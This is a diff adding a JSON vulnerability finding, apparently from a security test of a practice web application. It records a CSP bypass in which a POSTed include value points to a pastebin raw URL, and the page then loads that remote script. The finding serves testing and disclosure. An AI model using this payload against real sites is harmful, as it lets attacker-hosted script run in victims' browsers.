@@ -1,0 +1,10 @@
+{
+  "title": "CSP Bypass via allowlisted external script sources",
+  "location": "/vulnerabilities/csp",
+  "severity": "medium",
+  "proof": "CSP header: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com . POST with include=https://pastebin.com/raw/123 results in <script src='https://pastebin.com/raw/123'></script> being injected into the page, successfully bypassing CSP via the allowlisted pastebin.com domain.",
+  "stage": "component",
+  "precondition": "Authenticated session (low security level)",
+  "affected_actor": "admin",
+  "affected_resource": "vulnerability"
+}
